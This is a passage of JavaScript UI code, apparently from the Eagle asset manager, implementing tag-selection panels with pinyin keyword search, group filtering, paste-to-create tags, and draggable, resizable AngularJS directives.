        this.listData.tagGroups = this.rawData.tagGroups;
        this.listData.tagGroupsCountMap = {};
        delete this.listData.currentGroup;
    }

    // 建立 View Model 使用的資料，並更新畫面 
    updateItemList () {
        this.listData.currentIndex = -1;
        this.listData.items = [];
        
        const searchKeyword = this.listData.searchKeyword;
        let showCreateTagBtn = this.showCreateTagBtn && (searchKeyword !== "");
        let tags = [];           // 全部標籤
        let selectedTags = [];   // 最近使用的標籤
        let suggestionTags = []; // 推薦的標籤
        let suggestionMap = {};  // 推薦的標籤

        // this.rawData.tagManager.suggestions.forEach((tag, index) => {
        //     const existTagItem = this.rawData.tagItemsMap[tag];
        //     const suggestionItem = {
        //         type: 'tag',
        //         isSuggestion: true,
        //         isExist: !!existTagItem,
        //         name: existTagItem?.name ?? tag,
        //         color: existTagItem?.color ?? undefined,
        //         size: 26,
        //         group: existTagItem?.group ?? 'none',
        //         groups: existTagItem?.groups ?? undefined,
        //         groupsMap: existTagItem?.groupsMap ?? {},
        //         pinyin: existTagItem?.pinyin ?? undefined,
        //         imageCount: existTagItem?.imageCount ?? undefined,
        //     }
        //     suggestionMap[tag] = suggestionItem;
        //     suggestionTags.push(suggestionItem);
        // });

        this.rawData.tags.forEach((tag) => {
            const { name } = tag;
            const item = this.rawData.tagItemsMap[name];
            const newItem = { ...item };
            const isSelected = this.listData.selectedTags[name];
            const isSuggestion = suggestionMap[name];
            newItem.isRecent = this.rawData.recentTagsMap.hasOwnProperty(name);
            
            if (isSelected && this.pinSelected) {
                selectedTags.push(newItem);
            }
            else {
                if (!isSuggestion) {
                    tags.push(newItem);
                }
            }

            // 除非存在一模一樣的標籤，不然一律顯示此建立標籤按鈕
            if (name === searchKeyword) {
                showCreateTagBtn = false;
            }
        });

        if (suggestionTags.length > 0) {
            tags = [...suggestionTags, ...tags];
        }

        // 如果是全部 tab，此處排序順序為「已選」「分割線」「最近使用」「推薦」「常用」「剩餘」
        // sort selectedTags by a-z
        selectedTags = selectedTags.sort((a, b) => {
            const aGroup = a.group;
            const bGroup = b.group;
            const aGroupIdx = this.rawData.tagGroupsIndexMap[aGroup];
            const bGroupIdx = this.rawData.tagGroupsIndexMap[bGroup];
            if (!aGroup && bGroup) return 1;
            if (aGroup && !bGroup) return -1;
            if (aGroupIdx < bGroupIdx) return -1;
            if (aGroupIdx > bGroupIdx) return 1;
            
            const aName = a.name;
            const bName = b.name;
            if (aName < bName) return -1;
            if (aName > bName) return 1;
        
            return 0;
        });

        // sort tags by tag.group property
        tags = tags.sort((a, b) => {

            const aIsRecent = a.isRecent;
            const bIsRecent = b.isRecent;
            const aRecentIndex = this.rawData.recentTagsMap[a.name];
            const bRecentIndex = this.rawData.recentTagsMap[b.name];
            
            if (aIsRecent && bIsRecent) {
                if (aRecentIndex < bRecentIndex) return -1;
                if (aRecentIndex > bRecentIndex) return 1;
            }

            const aIsSuggestion = a.isSuggestion;
            const bIsSuggestion = b.isSuggestion;
            if (aIsSuggestion && !bIsSuggestion) return -1;
            if (!aIsSuggestion && bIsSuggestion) return 1;
            
            if (aIsRecent && !bIsRecent) return -1;
            if (!aIsRecent && bIsRecent) return 1;

            const aName = a.name;
            const bName = b.name;
            const aGroup = (a.group !== 'none')? a.group : undefined;
            const bGroup = (b.group !== 'none')? b.group : undefined;
            
            if (aGroup === bGroup) {
                if (aName < bName) return -1;
                if (aName > bName) return 1;
            }

            const aGroupIdx = this.rawData.tagGroupsIndexMap[aGroup];
            const bGroupIdx = this.rawData.tagGroupsIndexMap[bGroup];
            if (!aGroup && bGroup) return 1;
            if (aGroup && !bGroup) return -1;
            if (aGroupIdx < bGroupIdx) return -1;
            if (aGroupIdx > bGroupIdx) return 1;
       
            return 0;
        });

        selectedTags = this.filterByKeyword(selectedTags);
        tags = this.filterByKeyword(tags);

        // 計算結果數量（不含 group 篩選）
        const temp = [...selectedTags, ...tags];
        this.listData.tagGroupsCountMap = {};
        this.listData.tagGroupsCountMap['all'] = temp.length;
        temp.forEach((item) => {
            const group = item.group;
            Object.keys(item.groupsMap).forEach((group) => {
                if (this.listData.tagGroupsCountMap[group] === undefined) {
                    this.listData.tagGroupsCountMap[group] = 0;
                }
                this.listData.tagGroupsCountMap[group]++;
            });
        });

        selectedTags = this.filterByGroup(selectedTags);
        tags = this.filterByGroup(tags);

        let historyTags = [];
        let suggestTags = [];
        let normalTags = [];
        tags.forEach((item, index) => {
            if (item.type === 'tag' && item.isRecent && !item.isSuggestion && !this.listData.selectedTags[item.name]) {
                historyTags.push(item);
            }
            if (item.type === 'tag' && item.isSuggestion && !this.listData.selectedTags[item.name]) {
                suggestTags.push(item);
            }
            if (item.type === 'tag' && !item.isRecent && !item.isSuggestion && !this.listData.selectedTags[item.name]) {
                normalTags.push(item);
            }
        });

        if (historyTags.length > 0) {
            historyTags = [{ type: 'label', size: 28, name: i18n.__('selectTagPanel.label.recent') + ` (${historyTags.length})` }, ...historyTags, { type: 'separator', size: 5 }];
        }

        if (suggestTags.length > 0) {
            suggestTags = [{ type: 'label', size: 28, name: i18n.__('selectTagPanel.label.recommend') + ` (${suggestTags.length})` }, ...suggestTags, { type: 'separator', size: 5 }];
        }

        if (selectedTags.length > 0) {
            selectedTags = [{ type: 'label', size: 28, name: i18n.__('selectTagPanel.label.selected') + ` (${selectedTags.length})` }, ...selectedTags, { type: 'separator', size: 5 }];
        }

        if (normalTags.length > 0) {
            if (selectedTags.length > 0 || suggestTags.length > 0 || historyTags.length > 0) {
                normalTags = [{ type: 'label', size: 28, name: i18n.__('selectTagPanel.label.others') + ` (${normalTags.length})` }, ...normalTags];
            }
        }

        tags = [...suggestTags, ...historyTags, ...normalTags];

        if (selectedTags.length > 0) {
            this.listData.items = [...selectedTags, ...tags];
        }
        else {
            this.listData.items = [...tags];
        }
        
        // 顯示建立標籤按鈕
        if (showCreateTagBtn) {
            if (this.listData.items.length > 0) {
                this.listData.items = [{ type: 'create', size: 26, 'name': searchKeyword }, { type: 'separator', size: 9 }, ...this.listData.items];
            }
            else {
                this.listData.items = [{ type: 'create', size: 26, 'name': searchKeyword }];
            }
        }

        // 更新 index
        this.listData.items.forEach((item, index) => {
            item.index = index;
        });

        if (searchKeyword !== "") {
            const firstItem = this.listData.items.find(item => item.type === 'tag');
            // 有建立按鈕，但搜尋結果第一個項目開頭一樣時，自動選擇該項目
            if (firstItem && firstItem.name.toLowerCase && firstItem.name.toLowerCase().startsWith(searchKeyword.toLowerCase())) {
                this.listData.currentIndex = firstItem.index;
            }
            // 搜尋結果有內容時，自動選擇第一個項目
            else if (this.listData.items.length > 0) {
                this.listData.currentIndex = 0;
            }
            else {
                this.listData.currentIndex = -1;
            }
        }
        // 如果不是搜尋狀態，就不自動選擇第一個項目
        else {
            this.listData.currentIndex = -1;
        }

        // 避免最後一個標籤是 separator
        if (this.listData.items.length > 0 && this.listData.items[this.listData.items.length - 1].type === 'separator') {
            this.listData.items.pop();
        }
    }

    filterByKeyword (list) {
        if (this.listData.searchKeyword.length === 0) return list;

        const keyword_cn = chineseConvert.tw2cn(this.listData.searchKeyword);
        const temp = list.map(item => {
            const nameCN = chineseConvert.tw2cn(item.name);
            if (item.name.length >= 30) {
                return {
                    item: item,
                    name: nameCN,
                    search: [nameCN]
                }
            }
            return {
                item: item,
                name: nameCN,
                search: [nameCN, ..._.uniq(
                    cartesianProduct(pinyinlite(nameCN, { keepUnrecognized : true }).filter(p => p.length > 0))
                    .map(item => item.join(' '))
                )],
            };
        });

        const scores = temp.map(item => {
            const itemName = `${item.name ?? ''} ${item.keywords ?? ''}`;
            return {
                item: item,
                name: itemName,
                score: _.max(item.search.map(pinyin => pinyin.score(keyword_cn))),
            };
        });

        list = scores.filter(i => i.score > 0).sort((a, b) => b.score - a.score).map(function (i) {
            return i.item.item;
        });

        // sort start with keyword first
        const result = list.reduce((acc, cur) => {
            if (cur.name.toLowerCase().startsWith(this.listData.searchKeyword.toLowerCase())) {
                acc.startWithKeyword.push(cur);
            }
            else {
                acc.notStartWithKeyword.push(cur);
            }
            return acc;
        }, {
            startWithKeyword: [],
            notStartWithKeyword: [],
        });
        
        list = [...result.startWithKeyword, ...result.notStartWithKeyword];
       
        return list;
    }

    filterByGroup (list) {
        if (!this.listData.currentGroup?.id) return list; 
        return list.filter((item) => {
            try {
                return item.groupsMap[this.listData.currentGroup.id];
            }
            catch (err) {
                console.log(err);
                return false;
            }
        });
    }

    // 取得回傳結果
    getCallbackResult () {
        const isEqual = (a, b) => {
            const aEntries = Object.entries(a);
            const bEntries = Object.entries(b);
            return aEntries.length === bEntries.length && aEntries.every(([key, value]) => b[key] === value);
        };

        const isDirty = !isEqual(this.rawData.selectedTags, this.listData.selectedTags);
        const selectedTags = { ...this.listData.selectedTags };
        const deselectedTags = Object.entries(this.rawData.selectedTags).reduce((result, [name, isSelected]) => {
            if (!this.listData.selectedTags[name]) {
                result[name] = true;
            }
            return result;
        }, {});

        return { isDirty, selectedTags, deselectedTags };
    }

    close () {
        const result = this.getCallbackResult();
        if (result.isDirty) this.onChanged(result);
        super.close();
        this.reset();
    }

    selectGroup (group) {
        if (group === 'none') {
            this.listData.currentGroup = {
                id: 'none'
            }
        }
        else {
            this.listData.currentGroup = group;
        }
        this.updateItemList();
    }

    onPaste (event) {
        const clipboardText = clipboard.readText();
        if (!clipboardText) return;

        let tags = this.parseTags(clipboardText);

        // 表示包含多个标签
        if (tags.length > 1) {
            event.preventDefault();
            event.stopPropagation();

            tags = tags.map(function (tag) {
                return tag.trim();
            });

            tags = tags.filter(function (tag) {
                return tag && tag.trim().length > 0;
            });

            this.createdTags(tags);
        }
    }

    onTabKey (event) {
        const shiftKey = event.shiftKey;
        const order = [undefined, ...this.rawData.tagGroups.map(group => group.id), 'none'];
        const currentGroup = this.listData.currentGroup?.id;
        const currentIndex = order.indexOf(currentGroup);
        const prevIndex = (currentIndex - 1) % order.length;
        const nextIndex = (currentIndex + 1) % order.length;
        const targetGroup = (shiftKey)? order[prevIndex] : order[nextIndex];

        if (targetGroup === 'none') {
            this.listData.currentGroup = { id: 'none' };
        }
        else {
            this.listData.currentGroup = this.rawData.tagGroupsMap[targetGroup];
        }
        this.updateItemList();
    }

    openItem (event, item) {
        const pressCtrlOrCmd = event?.ctrlKey || event?.metaKey;
        if (item.type === 'create') {
            const tags = this.parseTags(this.listData.searchKeyword);
            this.createdTags(tags);
        }
        else if (item.type === 'tag') {
            const name = item.name;
            const selectedTags = this.listData.selectedTags;
            if (!selectedTags[name]) {
                selectedTags[name] = true;
                if (!this.rawData.tagItemsMap[name]) {
                    this.rawData.tagItemsMap[name] = item;
                    this.rawData.tags.push(item);
                }
            }
            else {
                delete selectedTags[name];
            }
            if (this.listData.searchKeyword !== "" && !pressCtrlOrCmd) {
                this.listData.searchKeyword = "";
                this.clearSearchInput();
                this.updateItemList();
            }
        }
    }

    keywordChanged () {
        this.updateItemList();
    }

    isItemSelectable (item) {
        const selectableTypes = { 'tag': true, 'create': true };
        return selectableTypes[item.type];
    }

    createdTags (tags) {
        if (tags.length === 0) return;

        tags = tags.map((tag) => tag.trim() || tag);
        tags = [...new Set(tags)];
        
        let selectedTags = { ...this.listData.selectedTags };
        const group = this.rawData.tagGroupsMap[this?.listData?.currentGroup?.id];
        tags.forEach(name => {
            
            if (this.rawData.tagItemsMap[name]) {
                selectedTags[name] = true;
                return;
            };

            const groupID = (group)? group.id : 'none';
            const color = (group)? group.color : undefined;
            const groups = (group)? [group.id] : [];
            let groupsMap = groups.reduce((acc, cur) => {
                acc[cur] = true;
                return acc;
            }, {});
            
            if (!group) groupsMap['none'] = true;

            const item = {
                type: 'tag',
                id: name,
                name: name,
                color: color,
                size: 26,
                group: groupID,
                groups: groups,
                groupsMap: groupsMap,
                pinyin: tinyPinyin.convertToPinyin(name),
                imageCount: 0
            };
            this.rawData.tagItemsMap[name] = item;
            this.rawData.tags.push(item);
            selectedTags[name] = true;
            if (group) {
                this.rawData.tagManager.addTagsToGroup(groupID, [name], false);
            }
        });
        this.listData.searchKeyword = "";
        this.listData.selectedTags = selectedTags;
        this.clearSearchInput();
        this.updateItemList();
    }

    parseTags (str) {
        try {
            return str.split(/[，,;、\n]+/).filter((tag) => tag.trim().length > 0);
        }
        catch (e) {
            return [];
        }
    }
}

EagleApp.directive('tagSelectPanel', ($timeout) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/tag-select-panel.html',
        replace: false,
        scope: {
            theme: '=theme'
        },
        link: (scope, element) => {

            const panel = new TagSelectPanel({
                scope: scope,
                panelSelector: "#tag-select-panel",
                searchInputSelector: "#tag-select-panel-search-input",
            });

            scope.$on('TAG.SELECT.PANEL.OPEN', (event, params) => {
                
                panel.init(params);

                $timeout(() => {
                    panel.open();
                }, 50);

                Object.assign(scope, {
                    listData: panel.listData,
                    selectGroup: (group) => {
                        panel.selectGroup(group);
                    },
                    openItem: (event, item) => {
                        panel.openItem(event, item);
                    },
                    hoverItem: (item) => {
                        panel.hoverItem(item.index);
                    },
                    close: () => {
                        panel.close();
                    },
                    focusSearchInput: () => {
                        panel.focusSearchInput();
                    },
                });
            });
        }
    }
})
class InspectorTagSelectPanel extends SelectPanel {
    
    originalParams
    searchKeyword
    rawData
    onChanged
    onAdd
    onRemove
    pinSelected = true
    isShowSidebar = localStorage['eagle.InspectorTagSelectPanel.isShowSidebar'] !== 'false'

    static open(params) {
        const $rootScope = angular.element("html").scope();
        $rootScope.$broadcast('INSPECTOR.TAG.SELECT.PANEL.OPEN', params);
    }

    constructor(params) {
        super(params);
    }

    init (params) {
        this.originalParams = params;
        super.init(params);
        this.pinSelected = params.pinSelected ?? true;
        this.reset();
        this.initRawData(params);
        this.updateItemList();
        this.onChanged = params.onChanged || (() => {});
        this.onAdd = params.onAdd || (() => {});
        this.onRemove = params.onRemove || (() => {});
        this.showCreateTagBtn = params.showCreateTagBtn ?? true;
        this.scrollTop();
    }

    reset () {
        super.reset();
        this.listData.selectedTags = {};
        this.rawData = {
            tags: [],
            tagItemsMap: {},
            tagGroups: [],
            tagGroupsMap: {},
            selectedTags: {},
        };
    }
    
    // 初始化資料
    initRawData(params) {

        this.rawData = {
            tagManager: params.tagManager,
            tags: angular.copy(params.tagManager.allTags) || [], // tag object > { name: "", color: "" }
            tagItemsMap: {},
            tagGroups: angular.copy(params.tagManager.groups) || [],
            tagGroupsMap: {},
            tagGroupsIndexMap: {},
            selectedTags: params.selectedTags || {},
            recentTagsMap: {},
        };

        // 建立 TagGroup map
        this.rawData.tagGroupsMap["none"] = {};
        this.rawData.tagGroups.forEach((tagGroup, index) => {
            this.rawData.tagGroupsMap[tagGroup.id] = tagGroup;
            this.rawData.tagGroupsIndexMap[tagGroup.id] = index;
        });
        
        // 建立 item list
        this.rawData.tags.forEach((tag) => {
            const { name, pinyin, groups, imageCount } = tag;
            const group = groups[0];
            let groupsMap = groups.reduce((acc, cur) => {
                acc[cur] = true;
                return acc;
            }, {});
            
            if (!group) groupsMap['none'] = true;

            const item = {
                type: 'tag',
                id: name,
                name: name,
                color: (group)? this.rawData.tagGroupsMap[group].color : undefined,
                size: 26,
                group: group || 'none',
                groups: groups,
                groupsMap: groupsMap,
                pinyin: pinyin,
                imageCount: imageCount
            };
            this.rawData.tagItemsMap[name] = item;
        });

        // 將 selectedTags 中不存在的標籤，加入到 rawData.tags 中
        Object.keys(this.rawData.selectedTags).forEach((name) => {
            if (!this.rawData.tagItemsMap[name]) {
                const item = {
                    type: 'tag',
                    id: name,
                    name: name,
                    color: undefined,
                    size: 26,
                    group: 'none',
                    groups: [],
                    groupsMap: { 'none': true },
                    pinyin: tinyPinyin.convertToPinyin(name),
                    imageCount: 0
                };
                this.rawData.tagItemsMap[name] = item;
                this.rawData.tags.push(item);
            }
        });
        
        let recentTagIdx = 1;
        const recentTagsMap = params.tagManager.historyTags.filter(tag => this.rawData.tagItemsMap[tag] !== undefined).slice(0, 12).reduce((acc, cur) => {
            acc[cur] = recentTagIdx++;
            return acc;
        }, {});
        this.rawData.recentTagsMap = recentTagsMap;
        
        // 設定預設已選擇的標籤
        this.listData.selectedTags = { ...this.rawData.selectedTags };
        this.listData.tagGroups = this.rawData.tagGroups;
        this.listData.tagGroupsCountMap = {};
        delete this.listData.currentGroup;
    }

    // 建立 View Model 使用的資料，並更新畫面 
    updateItemList () {
        this.listData.currentIndex = -1;
        this.listData.items = [];
        
        const searchKeyword = this.listData.searchKeyword;
        let showCreateTagBtn = this.showCreateTagBtn && (searchKeyword !== "");
        let tags = [];           // 全部標籤
        let selectedTags = [];   // 最近使用的標籤
        let suggestionTags = []; // 推薦的標籤
        let suggestionMap = {};  // 推薦的標籤

        this.rawData.tagManager.suggestions.forEach((tag, index) => {
            const existTagItem = this.rawData.tagItemsMap[tag];
            const suggestionItem = {
                type: 'tag',
                isSuggestion: true,
                isExist: !!existTagItem,
                name: existTagItem?.name ?? tag,
                color: existTagItem?.color ?? undefined,
                size: 26,
                group: existTagItem?.group ?? 'none',
                groups: existTagItem?.groups ?? undefined,
                groupsMap: existTagItem?.groupsMap ?? {},
                pinyin: existTagItem?.pinyin ?? undefined,
                imageCount: existTagItem?.imageCount ?? undefined,
            }
            suggestionMap[tag] = suggestionItem;
            suggestionTags.push(suggestionItem);
        });

        this.rawData.tags.forEach((tag) => {
            const { name } = tag;
            const item = this.rawData.tagItemsMap[name];
            const newItem = { ...item };
            const isSelected = this.listData.selectedTags[name];
            const isSuggestion = suggestionMap[name];
            newItem.isRecent = this.rawData.recentTagsMap.hasOwnProperty(name);
            
            if (isSelected && this.pinSelected) {
                selectedTags.push(newItem);
            }
            else {
                if (!isSuggestion) {
                    tags.push(newItem);
                }
            }

            // 除非存在一模一樣的標籤，不然一律顯示此建立標籤按鈕
            if (name === searchKeyword) {
                showCreateTagBtn = false;
            }
        });

        if (suggestionTags.length > 0) {
            tags = [...suggestionTags, ...tags];
        }

        // 如果是全部 tab，此處排序順序為「已選」「分割線」「最近使用」「推薦」「常用」「剩餘」
        // sort selectedTags by a-z
        selectedTags = selectedTags.sort((a, b) => {
            const aGroup = a.group;
            const bGroup = b.group;
            const aGroupIdx = this.rawData.tagGroupsIndexMap[aGroup];
            const bGroupIdx = this.rawData.tagGroupsIndexMap[bGroup];
            if (!aGroup && bGroup) return 1;
            if (aGroup && !bGroup) return -1;
            if (aGroupIdx < bGroupIdx) return -1;
            if (aGroupIdx > bGroupIdx) return 1;
            
            const aName = a.name;
            const bName = b.name;
            if (aName < bName) return -1;
            if (aName > bName) return 1;
        
            return 0;
        });

        // sort tags by tag.group property
        tags = tags.sort((a, b) => {

            const aIsRecent = a.isRecent;
            const bIsRecent = b.isRecent;
            const aRecentIndex = this.rawData.recentTagsMap[a.name];
            const bRecentIndex = this.rawData.recentTagsMap[b.name];
            
            if (aIsRecent && bIsRecent) {
                if (aRecentIndex < bRecentIndex) return -1;
                if (aRecentIndex > bRecentIndex) return 1;
            }

            const aIsSuggestion = a.isSuggestion;
            const bIsSuggestion = b.isSuggestion;
            if (aIsSuggestion && !bIsSuggestion) return -1;
            if (!aIsSuggestion && bIsSuggestion) return 1;
            
            if (aIsRecent && !bIsRecent) return -1;
            if (!aIsRecent && bIsRecent) return 1;

            const aName = a.name;
            const bName = b.name;
            const aGroup = (a.group !== 'none')? a.group : undefined;
            const bGroup = (b.group !== 'none')? b.group : undefined;

            if (aGroup === bGroup) {
                if (aName < bName) return -1;
                if (aName > bName) return 1;
            }

            const aGroupIdx = this.rawData.tagGroupsIndexMap[aGroup];
            const bGroupIdx = this.rawData.tagGroupsIndexMap[bGroup];
            if (!aGroup && bGroup) return 1;
            if (aGroup && !bGroup) return -1;
            if (aGroupIdx < bGroupIdx) return -1;
            if (aGroupIdx > bGroupIdx) return 1;
       
            return 0;
        });

        selectedTags = this.filterByKeyword(selectedTags);
        tags = this.filterByKeyword(tags);

        // 計算結果數量（不含 group 篩選）
        const temp = [...selectedTags, ...tags];
        this.listData.tagGroupsCountMap = {};
        this.listData.tagGroupsCountMap['all'] = temp.length;
        temp.forEach((item) => {
            const group = item.group;
            Object.keys(item.groupsMap).forEach((group) => {
                if (this.listData.tagGroupsCountMap[group] === undefined) {
                    this.listData.tagGroupsCountMap[group] = 0;
                }
                this.listData.tagGroupsCountMap[group]++;
            });
        });

        selectedTags = this.filterByGroup(selectedTags);
        tags = this.filterByGroup(tags);

        let historyTags = [];
        let suggestTags = [];
        let normalTags = [];
        tags.forEach((item, index) => {
            if (item.type === 'tag' && item.isRecent && !item.isSuggestion && !this.listData.selectedTags[item.name]) {
                historyTags.push(item);
            }
            if (item.type === 'tag' && item.isSuggestion && !this.listData.selectedTags[item.name]) {
                suggestTags.push(item);
            }
            if (item.type === 'tag' && !item.isRecent && !item.isSuggestion && !this.listData.selectedTags[item.name]) {
                normalTags.push(item);
            }
        });

        if (historyTags.length > 0) {
            historyTags = [{ type: 'label', size: 28, name: i18n.__('selectTagPanel.label.recent') + ` (${historyTags.length})` }, ...historyTags, { type: 'separator', size: 5 }];
        }

        if (suggestTags.length > 0) {
            suggestTags = [{ type: 'label', size: 28, name: i18n.__('selectTagPanel.label.recommend') + ` (${suggestTags.length})` }, ...suggestTags, { type: 'separator', size: 5 }];
        }

        if (selectedTags.length > 0) {
            selectedTags = [{ type: 'label', size: 28, name: i18n.__('selectTagPanel.label.selected') + ` (${selectedTags.length})` }, ...selectedTags, { type: 'separator', size: 5 }];
        }

        if (normalTags.length > 0) {
            if (selectedTags.length > 0 || suggestTags.length > 0 || historyTags.length > 0) {
                normalTags = [{ type: 'label', size: 28, name: i18n.__('selectTagPanel.label.others') + ` (${normalTags.length})` }, ...normalTags];
            }
        }

        tags = [...suggestTags, ...historyTags, ...normalTags];

        if (selectedTags.length > 0) {
            this.listData.items = [...selectedTags, ...tags];
        }
        else {
            this.listData.items = [...tags];
        }
        
        // 顯示建立標籤按鈕
        if (showCreateTagBtn) {
            if (this.listData.items.length > 0) {
                this.listData.items = [{ type: 'create', size: 26, 'name': searchKeyword }, { type: 'separator', size: 9 }, ...this.listData.items];
            }
            else {
                this.listData.items = [{ type: 'create', size: 26, 'name': searchKeyword }];
            }
        }

        // 更新 index
        this.listData.items.forEach((item, index) => {
            item.index = index;
        });

        if (searchKeyword !== "") {
            const firstItem = this.listData.items.find(item => item.type === 'tag');
            // 有建立按鈕，但搜尋結果第一個項目開頭一樣時，自動選擇該項目
            if (firstItem && firstItem.name.toLowerCase && firstItem.name.toLowerCase().startsWith(searchKeyword.toLowerCase())) {
                this.listData.currentIndex = firstItem.index;
            }
            // 搜尋結果有內容時，自動選擇第一個項目
            else if (this.listData.items.length > 0) {
                this.listData.currentIndex = 0;
            }
            else {
                this.listData.currentIndex = -1;
            }
        }
        // 如果不是搜尋狀態，就不自動選擇第一個項目
        else {
            this.listData.currentIndex = -1;
        }

        // 避免最後一個標籤是 separator
        if (this.listData.items.length > 0 && this.listData.items[this.listData.items.length - 1].type === 'separator') {
            this.listData.items.pop();
        }
    }

    filterByKeyword (list) {
        if (this.listData.searchKeyword.length === 0) return list;

        const keyword_cn = chineseConvert.tw2cn(this.listData.searchKeyword);
        const temp = list.map(item => {
            const nameCN = chineseConvert.tw2cn(item.name);
            if (item.name.length >= 30) {
                return {
                    item: item,
                    name: nameCN,
                    search: [nameCN]
                }
            }
            return {
                item: item,
                name: nameCN,
                search: [nameCN, ..._.uniq(
                    cartesianProduct(pinyinlite(nameCN, { keepUnrecognized : true }).filter(p => p.length > 0))
                    .map(item => item.join(' '))
                )],
            };
        });

        const scores = temp.map(item => {
            const itemName = `${item.name ?? ''} ${item.keywords ?? ''}`;
            return {
                item: item,
                name: itemName,
                score: _.max(item.search.map(pinyin => pinyin.score(keyword_cn))),
            };
        });

        list = scores.filter(i => i.score > 0).sort((a, b) => b.score - a.score).map(function (i) {
            return i.item.item;
        });

        // sort start with keyword first
        const result = list.reduce((acc, cur) => {
            if (cur.name.toLowerCase && cur.name.toLowerCase().startsWith(this.listData.searchKeyword.toLowerCase())) {
                acc.startWithKeyword.push(cur);
            }
            else {
                acc.notStartWithKeyword.push(cur);
            }
            return acc;
        }, {
            startWithKeyword: [],
            notStartWithKeyword: [],
        });
        
        list = [...result.startWithKeyword, ...result.notStartWithKeyword];
       
        return list;
    }

    filterByGroup (list) {
        if (!this.listData.currentGroup?.id) return list; 
        if (!this.isShowSidebar) return list;
        
        return list.filter((item) => {
            try {
                return item.groupsMap[this.listData.currentGroup.id];
            }
            catch (err) {
                console.log(err);
                return false;
            }
        });
    }

    close () {
        super.close();
        this.reset();
    }

    selectGroup (group) {
        if (group === 'none') {
            this.listData.currentGroup = {
                id: 'none'
            }
        }
        else {
            this.listData.currentGroup = group;
        }
        this.updateItemList();
    }

    onPaste (event) {
        const clipboardText = clipboard.readText();
        if (!clipboardText) return;

        let tags = this.parseTags(clipboardText);

        // 表示包含多个标签
        if (tags.length > 1) {
            event.preventDefault();
            event.stopPropagation();

            tags = tags.map(function (tag) {
                return tag.trim();
            });

            tags = tags.filter(function (tag) {
                return tag && tag.trim().length > 0;
            });

            this.createdTags(tags);
            this.onAdd(tags);
        }
    }

    onTabKey (event) {
        const shiftKey = event.shiftKey;
        const order = [undefined, ...this.rawData.tagGroups.map(group => group.id), 'none'];
        const currentGroup = this.listData.currentGroup?.id;
        const currentIndex = order.indexOf(currentGroup);
        const prevIndex = (currentIndex - 1) % order.length;
        const nextIndex = (currentIndex + 1) % order.length;
        const targetGroup = (shiftKey)? order[prevIndex] : order[nextIndex];

        if (targetGroup === 'none') {
            this.listData.currentGroup = { id: 'none' };
        }
        else {
            this.listData.currentGroup = this.rawData.tagGroupsMap[targetGroup];
        }
        this.updateItemList();
    }

    openItem (event, item) {
        const pressCtrlOrCmd = event?.ctrlKey || event?.metaKey;
        if (item.type === 'create') {
            const tags = this.parseTags(this.listData.searchKeyword);
            this.createdTags(tags);
            this.onAdd(tags);
        }
        else if (item.type === 'tag') {
            const name = item.name;
            const selectedTags = this.listData.selectedTags;
            if (!selectedTags[name]) {
                this.onAdd([name]);
                selectedTags[name] = true;   
                if (!this.rawData.tagItemsMap[name]) {
                    this.rawData.tagItemsMap[name] = item;
                    this.rawData.tags.push(item);
                }
            }
            else {
                this.onRemove([name]);
                delete selectedTags[name];
            }
            if (this.listData.searchKeyword !== "" && !pressCtrlOrCmd) {
                this.listData.searchKeyword = "";
                this.clearSearchInput();
                this.updateItemList();
            }
        }
    }

    keywordChanged () {
        this.updateItemList();
        this.scrollTop();
    }

    isItemSelectable (item) {
        const selectableTypes = { 'tag': true, 'create': true };
        return selectableTypes[item.type];
    }

    createdTags (tags) {
        if (tags.length === 0) return;

        tags = tags.map((tag) => tag.trim() || tag);
        tags = [...new Set(tags)];
        
        let selectedTags = { ...this.listData.selectedTags };
        const group = this.rawData.tagGroupsMap[this?.listData?.currentGroup?.id];
        tags.forEach(name => {
            
            if (this.rawData.tagItemsMap[name]) {
                selectedTags[name] = true;
                return;
            };

            const groupID = (group)? group.id : 'none';
            const color = (group)? group.color : undefined;
            const groups = (group)? [group.id] : [];
            let groupsMap = groups.reduce((acc, cur) => {
                acc[cur] = true;
                return acc;
            }, {});
            
            if (!group) groupsMap['none'] = true;

            const item = {
                type: 'tag',
                id: name,
                name: name,
                color: color,
                size: 26,
                group: groupID,
                groups: groups,
                groupsMap: groupsMap,
                pinyin: tinyPinyin.convertToPinyin(name),
                imageCount: 0
            };
            this.rawData.tagItemsMap[name] = item;
            this.rawData.tags.push(item);
            selectedTags[name] = true;
            if (group) {
                this.rawData.tagManager.addTagsToGroup(groupID, [name], false);
            }
        });
        this.listData.searchKeyword = "";
        this.listData.selectedTags = selectedTags;
        this.clearSearchInput();
        this.updateItemList();
    }

    parseTags (str) {
        try {
            return str.split(/[，,;、\n]+/).filter((tag) => tag.trim().length > 0);
        }
        catch (e) {
            return [];
        }
    }

    toggleSidebar () {
        this.listData.currentGroup = undefined;
        this.isShowSidebar = !this.isShowSidebar;
        this.updateItemList();
        localStorage['eagle.InspectorTagSelectPanel.isShowSidebar'] = this.isShowSidebar;
    }
}

EagleApp.directive('inspectorTagSelectPanel', ($timeout) => {
    return {
        restrict: 'E',
        templateUrl: 'js/directives/inspector-tag-select-panel.html',
        replace: false,
        scope: {
            TagManager: '=tagManager',
            selected: '=selected',
            theme: '=theme'
        },
        link: (scope, element) => {

            const $selectPanel = $(element).find('.select-panel');

            scope.isPined = false;

            scope.togglePined = () => {
                scope.isPined = !scope.isPined;
            };
            
            const panel = new InspectorTagSelectPanel({
                scope: scope,
                panelSelector: "#inspector-tag-select-panel",
                searchInputSelector: "#inspector-tag-select-panel-search-input",
            });

            // 窗口 draggable
            let dragOriginalSize = {};
            $selectPanel.draggable({
                scroll: false,
                containment: "body",
                start: function (e, ui) {
                    dragOriginalSize = {
                        height: ui.helper.outerHeight(),
                        width: ui.helper.outerWidth(),
                    };
                },
                stop: function () {
                    $selectPanel.height(dragOriginalSize.height);
                    $selectPanel.width(dragOriginalSize.width);
                    panel.fixedSize = true;
                }
            });
            // $selectPanel.draggable( 'disable' );

            // 窗口 resizable
            $selectPanel.resizable({
                maxWidth: 640,
                minWidth: 200,
                minHeight: 160,
                maxHeight: 640,
                containment: "body",
                handles: "n, e, s, w, ne, se, sw, nw",
                // 保存用户设置尺寸
                stop: function (event, ui) {
                    var height = element.height();
                    localStorage.setItem("eagle.tagsPopup.height", height);
                    panel.fixedSize = true;
                }
            });

            var resizeTimeout;
            $(window).on("resize.inspectTagSelect", function () {
                clearTimeout(resizeTimeout);
                resizeTimeout = setTimeout(function () {
                    if (scope.isPined) {

                        if (!$("#inspector-tag-select-panel").hasClass("open")) return;

                        var windowHeight = $(window).height();
                        var windowWidth = $(window).width();
                        var popupHeight = $selectPanel.height();
